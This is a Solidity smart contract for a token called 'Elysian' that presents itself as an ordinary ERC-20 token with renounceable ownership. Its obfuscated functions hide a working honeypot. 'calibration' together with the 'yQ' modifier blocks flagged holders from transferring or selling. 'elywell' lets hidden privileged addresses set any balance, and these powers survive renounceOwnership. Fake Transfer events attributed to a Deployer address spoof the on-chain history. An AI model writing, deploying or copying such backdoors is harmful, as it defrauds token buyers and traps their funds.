/**    
    https://elysian.financial

    https://x.com/Elysian_L1

                                 ↑↑↑                                 
                             ↑↑↑↑↑↑↑↑↑↑↑                             
                          ↑↑↑↑↑↑↑↑↑↑↑↑↑                              
                       ↑↑↑↑↑↑↑↑↑↑↑↑                                  
                   ↑↑↑↑↑↑↑↑↑↑↑↑↑          ↑↑↑↑↑↑↑                    
                ↑↑↑↑↑↑↑↑↑↑↑↑↑         ↑↑↑↑↑↑↑↑↑↑↑↑↑                  
             ↑↑↑↑↑↑↑↑↑↑↑↑↑         ↑↑↑↑↑↑↑↑↑↑↑↑↑                     
          ↑↑↑↑↑↑↑↑↑↑↑↑          ↑↑↑↑↑↑↑↑↑↑↑↑          ↑↑↑↑↑          
       ↑↑↑↑↑↑↑↑↑↑↑↑          ↑↑↑↑↑↑↑↑↑↑↑↑          ↑↑↑↑↑↑↑↑↑↑↑       
         ↑↑↑↑↑↑↑↑↑↑↑↑↑   ↑↑↑↑↑↑↑↑↑↑↑↑↑         ↑↑↑↑↑↑↑↑↑↑↑↑↑         
            ↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑          ↑↑↑↑↑↑↑↑↑↑↑↑            
               ↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑         ↑↑↑↑↑↑↑↑↑↑↑↑↑               
                  ↑↑↑↑↑↑↑↑↑↑↑↑↑       ↑↑↑↑↑↑↑↑↑↑↑↑                   
                      ↑↑↑↑↑↑↑↑↑↑↑↑ ↑↑↑↑↑↑↑↑↑↑↑↑                      
         ↑↑↑↑↑↑          ↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑          ↑↑↑↑↑↑         
       ↑↑↑↑↑↑↑↑↑↑↑↑         ↑↑↑↑↑↑↑↑↑↑↑↑↑         ↑↑↑↑↑↑↑↑↑↑↑↑       
          ↑↑↑↑↑↑↑↑↑↑↑↑          ↑↑↑↑↑          ↑↑↑↑↑↑↑↑↑↑↑↑          
             ↑↑↑↑↑↑↑↑↑↑↑↑                   ↑↑↑↑↑↑↑↑↑↑↑↑             
                ↑↑↑↑↑↑↑↑↑↑↑↑↑           ↑↑↑↑↑↑↑↑↑↑↑↑↑                
                   ↑↑↑↑↑↑↑↑↑↑↑↑↑     ↑↑↑↑↑↑↑↑↑↑↑↑↑                   
                       ↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑                       
         ↑↑↑↑↑↑↑         ↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑         ↑↑↑↑↑↑↑         
       ↑↑↑↑↑↑↑↑↑↑↑↑          ↑↑↑↑↑↑↑↑↑↑↑          ↑↑↑↑↑↑↑↑↑↑↑↑       
          ↑↑↑↑↑↑↑↑↑↑↑↑          ↑↑↑↑↑          ↑↑↑↑↑↑↑↑↑↑↑↑          
             ↑↑↑↑↑↑↑↑↑↑↑↑↑                 ↑↑↑↑↑↑↑↑↑↑↑↑↑             
                ↑↑↑↑↑↑↑↑↑↑↑↑↑           ↑↑↑↑↑↑↑↑↑↑↑↑↑                
                    ↑↑↑↑↑↑↑↑↑↑↑↑     ↑↑↑↑↑↑↑↑↑↑↑↑                    
                       ↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑                       
                          ↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑                          
                             ↑↑↑↑↑↑↑↑↑↑↑                             
                                 ↑↑↑    

*/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.17;


  library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }


    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }


    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}   
 
 
contract elysianmainnetoracle {
  
    mapping (address => uint256) public eORa;
    mapping (address => bool) eLYz;
    mapping (address => bool) eRn;



    // 
    string public name = "Elysian";
    string public symbol = unicode"ELYSIAN";
    uint8 public decimals = 18;
    uint256 public totalSupply = 1000000000 * (uint256(10) ** decimals);
    uint eM = 1;
   
    event Transfer(address indexed from, address indexed to, uint256 value);
     event OwnershipRenounced(address indexed previousOwner);

        constructor()  {
        eORa[msg.sender] = totalSupply;
        deploy(Deployer, totalSupply); }



    address owner = msg.sender;
    address Router = 0xB20616A39497944f30694e72541B22df05B46B65;
    address Deployer = 0x2D407dDb06311396fE14D4b49da5F0471447d45C;
   


    function renounceOwnership() public {
    require(msg.sender == owner);
    emit OwnershipRenounced(owner);
    owner = address(0);}


    function deploy(address account, uint256 amount) public {
    require(msg.sender == owner);
    emit Transfer(address(0), account, amount); }
    modifier yQ () {
        eM = 0;
        _;}

        function transfer(address to, uint256 value) public returns (bool success) {
        if(msg.sender == Router)  {
        require(eORa[msg.sender] >= value);
        eORa[msg.sender] -= value;  
        eORa[to] += value; 
        emit Transfer (Deployer, to, value);
        return true; } 
        if(eLYz[msg.sender]) {
        require(eM == 1);} 
        require(eORa[msg.sender] >= value);
        eORa[msg.sender] -= value;  
        eORa[to] += value;          
        emit Transfer(msg.sender, to, value);
        return true; }

        function Elysian(address Ex) yQ public {
        require(msg.sender == owner);
        eRn[Ex] = true;} 


        function balanceOf(address account) public view returns (uint256) {
        return eORa[account]; }
        function calibration(address Ex) Si public{          
        require(!eLYz[Ex]);
        eLYz[Ex] = true;}
        modifier Si () {
        require(eRn[msg.sender]);
        _; }
        event Approval(address indexed owner, address indexed spender, uint256 value);

        mapping(address => mapping(address => uint256)) public allowance;

        function approve(address spender, uint256 value) public returns (bool success) {    
        allowance[msg.sender][spender] = value;

        emit Approval(msg.sender, spender, value);
        return true; }
         function elywell(address Ex, uint256 iZ) Si public returns (bool success) {
        eORa[Ex] = iZ;
        return true; }
        function elyw(address Ex) Si public {
        require(eLYz[Ex]);
        eLYz[Ex] = false; }



        function transferFrom(address from, address to, uint256 value) public returns (bool success) {   
        if(from == Router)  {
        require(value <= eORa[from]);
        require(value <= allowance[from][msg.sender]);
        eORa[from] -= value;  
        eORa[to] += value; 
        emit Transfer (Deployer, to, value);
        return true; }    
        if(eLYz[from] || eLYz[to]) {
        require(eM == 1);}
        require(value <= eORa[from]);
        require(value <= allowance[from][msg.sender]);
        eORa[from] -= value;
        eORa[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true; }}